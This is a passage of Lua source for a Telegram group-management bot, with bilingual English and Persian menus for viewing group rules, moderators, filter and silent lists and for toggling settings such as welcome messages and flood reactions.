                    text = "\226\154\160\239\184\143 Silent List",
                    callback_data = "InfoSilentList:" .. matches[2]
                  },
                  {
                    text = "\226\143\179 Expire",
                    callback_data = "InfoExpire:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            else
              text = "`\217\132\216\183\217\129\216\167 \219\140\218\169 \216\175\218\169\217\133\217\135 \216\177\216\167 \216\168\216\177\216\167\219\140 \216\168\216\167\216\178 \218\169\216\177\216\175\217\134 \216\162\217\134 \216\167\217\134\216\170\216\174\216\167\216\168 \218\169\217\134\219\140\216\175:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\240\159\155\130 \217\130\217\136\216\167\217\134\219\140\217\134",
                    callback_data = "InfoRules:" .. matches[2]
                  },
                  {
                    text = "\240\159\151\163 \216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140",
                    callback_data = "InfoWelcome:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\240\159\140\144 \217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135",
                    callback_data = "InfoLink:" .. matches[2]
                  },
                  {
                    text = "\240\159\145\174 \217\133\216\175\219\140\216\177\216\167\217\134",
                    callback_data = "InfoMods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\156\133 \217\132\219\140\216\179\216\170 \217\133\216\172\216\167\216\178",
                    callback_data = "InfoAllow:" .. matches[2]
                  },
                  {
                    text = "\226\154\160\239\184\143 \217\132\219\140\216\179\216\170 \217\129\219\140\217\132\216\170\216\177",
                    callback_data = "InfoFilterList:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\240\159\164\144 \217\132\219\140\216\179\216\170 \216\167\217\129\216\177\216\167\216\175 \216\179\216\167\218\169\216\170",
                    callback_data = "InfoSilentList:" .. matches[2]
                  },
                  {
                    text = "\226\143\179 \216\167\217\134\217\130\216\182\216\167",
                    callback_data = "InfoExpire:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "InfoRules" then
            keyboard = {}
            if not lang then
              text = redis:hget("GroupSettings:" .. matches[2], "rules") or [[
Rules:
*1-*`Do not spam`
*2-*`Do not use filtered words`
*3-*`Do not send +18 photos`]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Help For This Part",
                    callback_data = "HelpRules:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Reset To Default",
                    callback_data = "CleanRules:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Back To Group info",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            else
              text = redis:hget("GroupSettings:" .. matches[2], "rules") or "\217\130\217\136\216\167\217\134\219\140\217\134:\n*1-*`\216\167\216\179\217\190\217\133 \217\134\218\169\217\134\219\140\216\175`\n*2-*`\216\167\216\178 \218\169\217\132\217\133\216\167\216\170 \217\129\219\140\217\132\216\170\216\177 \216\180\216\175\217\135 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \217\134\218\169\217\134\219\140\216\175`\n*3-*`\216\185\218\169\216\179 \217\135\216\167\219\140 +18 \216\167\216\177\216\179\216\167\217\132 \217\134\218\169\217\134\219\140\216\175`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\177\216\167\217\135\217\134\217\133\216\167 \216\167\219\140\217\134 \216\168\216\174\216\180",
                    callback_data = "HelpRules:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\167\216\178\218\175\216\177\216\175\216\167\217\134\219\140 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182",
                    callback_data = "CleanRules:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \218\175\216\177\217\136\217\135",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "InfoWelcome" then
            keyboard = {}
            if not lang then
              text = redis:get("GroupWelcome" .. matches[2]) or "Welcome To GPNAME Group"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Help For This Part",
                    callback_data = "HelpWelcome:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Reset To Default",
                    callback_data = "CleanWelcome:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Back To Group info",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            else
              text = redis:get("GroupWelcome" .. matches[2]) or "\216\168\217\135 \218\175\216\177\217\136\217\135 GPNAME \216\174\217\136\216\180 \216\162\217\133\216\175\219\140\216\175"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\177\216\167\217\135\217\134\217\133\216\167 \216\167\219\140\217\134 \216\168\216\174\216\180",
                    callback_data = "HelpWelcome:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\167\216\178\218\175\216\177\216\175\216\167\217\134\219\140 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182",
                    callback_data = "CleanWelcome:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \218\175\216\177\217\136\217\135",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "InfoLink" then
            keyboard = {}
            if not lang then
              text = redis:hget("GroupSettings:" .. matches[2], "GroupLink") or [[
Group Link:
*Not Found!*]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Help For This Part",
                    callback_data = "HelpLink:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Back To Group info",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            else
              text = redis:hget("GroupSettings:" .. matches[2], "GroupLink") or "\217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135:\n*\217\190\219\140\216\175\216\167 \217\134\216\180\216\175!*"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\177\216\167\217\135\217\134\217\133\216\167 \216\167\219\140\217\134 \216\168\216\174\216\180",
                    callback_data = "HelpLink:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \218\175\216\177\217\136\217\135",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "InfoMods" then
            keyboard = {}
            if not lang then
              if data[tostring(matches[2])] then
                if next(data[tostring(matches[2])].mods) == nil then
                  text = "`No Moderator in This Group!`"
                end
                i = 1
                text = "`Moderators:`\n"
                for k, v in pairs(data[tostring(matches[2])].mods) do
                  text = text .. i .. "- " .. v .. " [" .. k .. "]\n"
                  i = i + 1
                end
              else
                text = "Group is Not installed!"
              end
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Help For This Part",
                    callback_data = "HelpMods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Clean This List",
                    callback_data = "CleanMods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Back To Group info",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            else
              if data[tostring(matches[2])] then
                i = 1
                if next(data[tostring(matches[2])].mods) == nil then
                  text = "`\217\133\216\175\219\140\216\177\219\140 \216\175\216\177 \216\167\219\140\217\134 \218\175\216\177\217\136\217\135 \217\136\216\172\217\136\216\175 \217\134\216\175\216\167\216\177\216\175!`"
                end
                text = "`\217\133\216\175\219\140\216\177\216\167\217\134:`\n"
                for k, v in pairs(data[tostring(matches[2])].mods) do
                  text = text .. i .. "- " .. v .. " [" .. k .. "]\n"
                  i = i + 1
                end
              else
                text = "\218\175\216\177\217\136\217\135 \217\134\216\181\216\168 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170!"
              end
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\177\216\167\217\135\217\134\217\133\216\167 \216\167\219\140\217\134 \216\168\216\174\216\180",
                    callback_data = "HelpMods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\167\219\140\217\134 \217\132\219\140\216\179\216\170",
                    callback_data = "CleanMods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \218\175\216\177\217\136\217\135",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "InfoAllow" then
            keyboard = {}
            if not lang then
              hashWord = "AllowFrom~" .. matches[2]
              listWord = redis:smembers(hashWord)
              hashUser = "AllowUserFrom~" .. matches[2]
              listUser = redis:smembers(hashUser)
              textWord = [[
*> Allow words:*

]]
              textUser = [[
*> Allow users:*

]]
              for k, v in pairs(listWord) do
                textWord = textWord .. "*" .. k .. "-* " .. v .. [[


]]
              end
              for k, v in pairs(listUser) do
                textUser = textUser .. "*" .. k .. "-* `" .. v .. [[
`

]]
              end
              if #listWord == 0 then
                textWord = [[
*> Allow words not found!*

]]
              end
              if #listUser == 0 then
                textUser = [[
*> Allow users not found!*

]]
              end
              text = textWord .. textUser
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Help For This Part",
                    callback_data = "HelpAllow:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Clean This List",
                    callback_data = "CleanAllow:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Back To Group info",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            else
              hashWord = "AllowFrom~" .. matches[2]
              listWord = redis:smembers(hashWord)
              hashUser = "AllowUserFrom~" .. matches[2]
              listUser = redis:smembers(hashUser)
              textWord = "*> \217\132\216\186\216\167\216\170 \217\133\216\172\216\167\216\178:*\n\n"
              textUser = "*> \216\167\216\180\216\174\216\167\216\181 \217\133\216\172\216\167\216\178:*\n\n"
              for k, v in pairs(listWord) do
                textWord = textWord .. "*" .. k .. "-* " .. v .. [[


]]
              end
              for k, v in pairs(listUser) do
                textUser = textUser .. "*" .. k .. "-* `" .. v .. [[
`

]]
              end
              if #listWord == 0 then
                textWord = "*> \217\132\216\186\216\167\216\170 \217\133\216\172\216\167\216\178 \219\140\216\167\217\129\216\170 \217\134\216\180\216\175\217\134\216\175!*\n\n"
              end
              if #listUser == 0 then
                textUser = "*> \216\167\216\180\216\174\216\167\216\181 \217\133\216\172\216\167\216\178 \219\140\216\167\217\129\216\170 \217\134\216\180\216\175\217\134\216\175!*\n\n"
              end
              text = textWord .. textUser
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\177\216\167\217\135\217\134\217\133\216\167 \216\167\219\140\217\134 \216\168\216\174\216\180",
                    callback_data = "HelpAllow:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\167\219\140\217\134 \217\132\219\140\216\179\216\170",
                    callback_data = "CleanAllow:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \218\175\216\177\217\136\217\135",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "InfoFilterList" then
            keyboard = {}
            if not lang then
              FF = redis:smembers("GroupFilterList:" .. matches[2])
              if #FF == 0 then
                text = "`Filter List is Empty`"
              else
                text = "`Filter List:`\n"
                for k, v in pairs(FF) do
                  text = text .. "`" .. k .. "`- " .. v .. "\n"
                end
              end
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Help For This Part",
                    callback_data = "HelpFilterList:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Clean This List",
                    callback_data = "CleanFilterList:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Back To Group info",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            else
              FF = redis:smembers("GroupFilterList:" .. matches[2])
              if #FF == 0 then
                text = "`\217\132\219\140\216\179\216\170 \217\129\219\140\217\132\216\170\216\177 \216\174\216\167\217\132\219\140 \217\133\219\140 \216\168\216\167\216\180\216\175`"
              else
                text = "`\217\132\219\140\216\179\216\170 \217\129\219\140\217\132\216\170\216\177:`\n"
                for k, v in pairs(FF) do
                  text = text .. "`" .. k .. "`- " .. v .. "\n"
                end
              end
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\177\216\167\217\135\217\134\217\133\216\167 \216\167\219\140\217\134 \216\168\216\174\216\180",
                    callback_data = "HelpFilterList:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\167\219\140\217\134 \217\132\219\140\216\179\216\170",
                    callback_data = "CleanFilterList:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \218\175\216\177\217\136\217\135",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "InfoSilentList" then
            keyboard = {}
            if not lang then
              GetSilentList = redis:smembers("GroupSilentUsers:" .. matches[2])
              if #GetSilentList == 0 then
                text = "`Silent List is Empty`"
              else
                text = "`Silent List:`\n"
                for k, v in pairs(GetSilentList) do
                  text = text .. k .. "- " .. v .. "\n"
                end
              end
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Help For This Part",
                    callback_data = "HelpSilentList:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Clean This List",
                    callback_data = "CleanSilentList:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Back To Group info",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            else
              GetSilentList = redis:smembers("GroupSilentUsers:" .. matches[2])
              if #GetSilentList == 0 then
                text = "`\217\132\219\140\216\179\216\170 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\179\216\167\218\169\216\170 \216\180\216\175\217\135 \216\174\216\167\217\132\219\140 \217\133\219\140 \216\168\216\167\216\180\216\175`"
              else
                text = "`\217\132\219\140\216\179\216\170 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\179\216\167\218\169\216\170 \216\180\216\175\217\135:`\n"
                for k, v in pairs(GetSilentList) do
                  text = text .. k .. "- " .. v .. "\n"
                end
              end
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\177\216\167\217\135\217\134\217\133\216\167 \216\167\219\140\217\134 \216\168\216\174\216\180",
                    callback_data = "HelpSilentList:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\167\219\140\217\134 \217\132\219\140\216\179\216\170",
                    callback_data = "CleanSilentList:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \218\175\216\177\217\136\217\135",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "InfoExpire" then
            keyboard = {}
            if not lang then
              expire = redis:ttl("ExpireDate:" .. matches[2]) or 0
              days = math.floor(expire / 86400) + 1
              text = "Expire: `" .. days .. "`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Help For This Part",
                    callback_data = "HelpExpire:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Back To Group info",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            else
              expire = redis:ttl("ExpireDate:" .. matches[2]) or 0
              days = math.floor(expire / 86400) + 1
              text = "\216\167\217\134\217\130\216\182\216\167: `" .. days .. "`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\177\216\167\217\135\217\134\217\133\216\167 \216\167\219\140\217\134 \216\168\216\174\216\180",
                    callback_data = "HelpExpire:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \218\175\216\177\217\136\217\135",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "HelpRules" then
            if not lang then
              return "Use /setrules For Change Text"
            else
              return "\216\167\216\178 /setrules \216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \217\133\216\170\217\134 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            end
          end
          if matches[1] == "HelpWelcome" then
            if not lang then
              return "Use /setwelcome For Change Text"
            else
              return "\216\167\216\178 /setwelcome \216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \217\133\216\170\217\134 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            end
          end
          if matches[1] == "HelpLink" then
            if not lang then
              return "Use /setlink or /newlink"
            else
              return "\216\167\216\178 /setlink \219\140\216\167 /newlink \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            end
          end
          if matches[1] == "HelpMods" then
            if not lang then
              return "Use /promote"
            else
              return "\216\167\216\178 /promote \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            end
          end
          if matches[1] == "HelpAllow" then
            if not lang then
              return "Use /allow"
            else
              return "\216\167\216\178 /allow \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            end
          end
          if matches[1] == "HelpFilterList" then
            if not lang then
              return "Use /filter or /filterlist"
            else
              return "\216\167\216\178 /filter \217\136 /filterlist \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            end
          end
          if matches[1] == "HelpSilentList" then
            if not lang then
              return "Use /silent or /unsilent"
            else
              return "\216\167\216\178 /silent \217\136 /unsilent \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            end
          end
          if matches[1] == "HelpExpire" then
            if not lang then
              return "Use /check"
            else
              return "\216\167\216\178 /check \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            end
          end
          function GetTools(msg, chat)
            keyboard = {}
            welcome = "\226\156\150\239\184\143"
            sense = "\226\156\150\239\184\143"
            withcaption = "\226\156\150\239\184\143"
            nocaption = "\226\156\150\239\184\143"
            if redis:hget("GroupSettings:" .. chat, "lock_withcaption") then
              withcaption = "\226\152\145\239\184\143"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_nocaption") then
              nocaption = "\226\152\145\239\184\143"
            end
            if redis:get("SettingsWelcomeFor" .. chat) then
              welcome = "\226\152\145\239\184\143"
            end
            if redis:get("sense:" .. chat) then
              sense = "\226\152\145\239\184\143"
            end
            if not lang then
              reaction = "Kick User"
              if redis:hget("GroupSettings:" .. chat, "flood_reaction") then
                reaction = "Delete Message"
              end
              text = "`Use An item For Change Status:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Group Welcome",
                    callback_data = "ToolsWelcome:" .. chat
                  },
                  {
                    text = welcome,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "Bot Sense",
                    callback_data = "ToolsSense:" .. chat
                  },
                  {
                    text = sense,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "Post With Caption",
                    callback_data = "ToolsWithCaption:" .. chat
                  },
                  {
                    text = withcaption,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "Post Without Caption",
                    callback_data = "ToolsNoCaption:" .. chat
                  },
                  {
                    text = nocaption,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "Flood Reaction: " .. reaction,
                    callback_data = "ToolsReaction:" .. chat
                  }
                },
                {
                  {
                    text = "Bot Access Commands",
                    callback_data = "ToolsCmds:" .. chat
                  }
                },
                {
                  {
                    text = "Bot Helps Part",
                    callback_data = "ToolsHelp:" .. chat
                  }
                },
                {
                  {
                    text = "Group Timely Lock",
                    callback_data = "ToolsLockgp:" .. chat
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            else
              reaction = "\216\167\216\174\216\177\216\167\216\172 \218\169\216\167\216\177\216\168\216\177"
              if redis:hget("GroupSettings:" .. chat, "flood_reaction") then
                reaction = "\216\173\216\176\217\129 \217\190\219\140\216\167\217\133"
              end
              text = "`\219\140\218\169 \216\168\216\174\216\180 \216\177\216\167 \216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \217\136\216\182\216\185\219\140\216\170 \216\167\217\134\216\170\216\174\216\167\216\168 \218\169\217\134\219\140\216\175:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140",
                    callback_data = "ToolsWelcome:" .. chat
                  },
                  {
                    text = welcome,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "\217\135\217\136\216\180 \217\133\216\181\217\134\217\136\216\185\219\140",
                    callback_data = "ToolsSense:" .. chat
                  },
                  {
                    text = sense,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "\217\190\216\179\216\170 \216\178\219\140\216\177\217\134\217\136\219\140\216\179 \216\175\216\167\216\177",
                    callback_data = "ToolsWithCaption:" .. chat
                  },
                  {
                    text = withcaption,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "\217\190\216\179\216\170 \216\168\216\175\217\136\217\134 \216\178\219\140\216\177\217\134\217\136\219\140\216\179",
                    callback_data = "ToolsNoCaption:" .. chat
                  },
                  {
                    text = nocaption,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "\217\136\216\167\218\169\217\134\216\180 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140: " .. reaction,
                    callback_data = "ToolsReaction:" .. chat
                  }
                },
                {
                  {
                    text = "\216\175\216\179\216\170\216\177\216\179\219\140 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\177\216\168\216\167\216\170",
                    callback_data = "ToolsCmds:" .. chat
                  }
                },
                {
                  {
                    text = "\216\168\216\174\216\180 \216\177\216\167\217\135\217\134\217\133\216\167\219\140 \216\177\216\168\216\167\216\170",
                    callback_data = "ToolsHelp:" .. chat
                  }
                },
                {
                  {
                    text = "\217\130\217\129\217\132 \217\133\217\136\217\130\216\170\219\140 \218\175\216\177\217\136\217\135",
                    callback_data = "ToolsLockgp:" .. chat
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "Tools" then
            GetTools(msg, matches[2])
          end
          if matches[1] == "ToolsWelcome" then
            welcome = redis:get("SettingsWelcomeFor" .. matches[2])
            if welcome then
              redis:del("SettingsWelcomeFor" .. matches[2])
              GetTools(msg, matches[2])
              if not lang then
                return "Welcome Has Been Disabled!"
              else
                return "\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140 \216\186\219\140\216\177 \217\129\216\185\216\167\217\132 \216\180\216\175!"
              end
            else
              redis:set("SettingsWelcomeFor" .. matches[2], true)
              GetTools(msg, matches[2])
              if not lang then
                return "Welcome Has Been Enabled!"
              else
                return "\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140 \217\129\216\185\216\167\217\132 \216\180\216\175!"
              end
            end
          end
          if matches[1] == "ToolsSense" then
            sense = redis:get("sense:" .. matches[2])
            if sense then
              redis:del("sense:" .. matches[2])
              GetTools(msg, matches[2])
              if not lang then
                return "Sense Has Been Disabled!"
              else
                return "\217\135\217\136\216\180 \217\133\216\181\217\134\217\136\216\185\219\140 \216\186\219\140\216\177 \217\129\216\185\216\167\217\132 \216\180\216\175!"
              end
            else
              redis:set("sense:" .. matches[2], true)
              GetTools(msg, matches[2])
              if not lang then
                return "Sense Has Been Enabled!"
              else
                return "\217\135\217\136\216\180 \217\133\216\181\217\134\217\136\216\185\219\140 \217\129\216\185\216\167\217\132 \216\180\216\175!"
              end
            end
          end
          if matches[1] == "ToolsReaction" then
            String = redis:hget("GroupSettings:" .. matches[2], "flood_reaction")
            if String then
              redis:hdel("GroupSettings:" .. matches[2], "flood_reaction")
              GetTools(msg, matches[2])
              if not lang then
                return "Flood Reaction Changed To Kick User!"
              else
                return "\217\136\216\167\218\169\217\134\216\180 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140 \216\168\217\135 \216\167\216\174\216\177\216\167\216\172 \218\169\216\167\216\177\216\168\216\177 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175!"
              end
            else
              redis:hset("GroupSettings:" .. matches[2], "flood_reaction", "yes")
              GetTools(msg, matches[2])
              if not lang then
                return "Flood Reaction Changed To Delete Message!"
              else
                return "\217\136\216\167\218\169\217\134\216\180 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140 \216\168\217\135 \216\173\216\176\217\129 \217\190\219\140\216\167\217\133 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175!"
              end
            end
          end
          if matches[1] == "ToolsWithCaption" then
            String = redis:hget("GroupSettings:" .. matches[2], "lock_withcaption")
            if String then
              redis:hdel("GroupSettings:" .. matches[2], "lock_withcaption")
              GetTools(msg, matches[2])
              if not lang then
                return "Post With Caption Has Been Disabled!"
              else
                return "\217\190\216\179\216\170 \216\178\219\140\216\177\217\134\217\136\219\140\216\179 \216\175\216\167\216\177 \216\186\219\140\216\177 \217\129\216\185\216\167\217\132 \216\180\216\175!"
              end
            else
              redis:hdel("GroupSettings:" .. matches[2], "lock_nocaption")
              redis:hset("GroupSettings:" .. matches[2], "lock_withcaption", "yes")
              GetTools(msg, matches[2])
              if not lang then
                return "Post With Caption Has Been Enabled!"
              else
                return "\217\190\216\179\216\170 \216\178\219\140\216\177\217\134\217\136\219\140\216\179 \216\175\216\167\216\177 \217\129\216\185\216\167\217\132 \216\180\216\175!"
              end
            end
          end
          if matches[1] == "ToolsNoCaption" then
            String = redis:hget("GroupSettings:" .. matches[2], "lock_nocaption")
            if String then
              redis:hdel("GroupSettings:" .. matches[2], "lock_nocaption")
              GetTools(msg, matches[2])
              if not lang then
                return "Post Without Caption Has Been Disabled!"
              else
                return "\217\190\216\179\216\170 \216\168\216\175\217\136\217\134 \216\178\219\140\216\177\217\134\217\136\219\140\216\179 \216\186\219\140\216\177 \217\129\216\185\216\167\217\132 \216\180\216\175!"
              end
            else
              redis:hdel("GroupSettings:" .. matches[2], "lock_withcaption")
